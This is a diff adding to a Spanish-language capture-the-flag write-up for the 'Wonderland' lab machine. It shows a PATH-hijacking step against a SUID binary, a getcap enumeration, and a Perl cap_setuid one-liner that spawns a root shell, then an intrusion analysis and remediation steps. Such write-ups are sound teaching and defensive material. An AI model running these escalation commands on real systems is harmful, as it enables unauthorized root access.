@@ -80,7 +80,42 @@ Se llama a date sin especificar la ruta, ahi tenemos nuestro punto de fallo
 ```
 rabbit@wonderland:/home/rabbit$ mkdir tools
 rabbit@wonderland:/home/rabbit$ cd tools
-rabbit@wonderland:/home/rabbit/tools$ cp /bin/bash date
+rabbit@wonderland:/home/rabbit/tools$ echo '/bin/bash' > date 
 rabbit@wonderland:/home/rabbit/tools$ PATH=$PWD:$PATH
-
+rabbit@wonderland:/home/rabbit$ ./teaParty 
 ```
+### Hatter
+No se por que no enumere antes capabilities, pero si las miramos tenemos lo siguiente
+```
+hatter@wonderland:~$ getcap -r / 2> /dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+Dos setuid caps, podemos abusar de ellas desde cualquier user
+```
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+Y ya somos root
+
+# Analisis de la intrusión
+### Sensible data leak
+Las credenciales de Alice quedaron expuestas en la pagina web
+### Vuln python script
+El script de walrus_and_the_carpenter.py que puede ser ejcutado por alice como Rabbit es vulnerable a un python path hijacking de modo que hemos podido usarlo para escalar lateralmente a rabbit
+### Vuln bin with suid
+El binario de teaParty utiliza una llamada sin la ruta completa a date, esto permite que efecutemos un PATH hijacking escalando  lateralmente a hatter
+### Perl Set UID capabilities 
+La capability cap_setuid+ep esta activa en los binarios de perl, esto nos ha permitido escalar hasta root
+
+
+# Solucion
+### Vuln python script
+Hay varios parches que habria que hacer para mitigar esto:
+* 1. Hacer el PYTHONPATH no modificable
+* 2. Mover el script a una carpeta donde no tenga permiso de escritura el resto de usuarios
+* 3. Eliminar la posibilad de ejecutar este script como otro usuario
+### Vuln bin with SUID
+Hay dos tipos de parche posibles, el primero quitat el SUID de aquí y cortariamos de raíz el problema, el segundo podemos usar la ruta absoluta para llamar al binario de date
+### Perl Set UID capabilities
+La contramedida posible seria quitar la capabilitie de los dos binarios de perl que la tienen activa
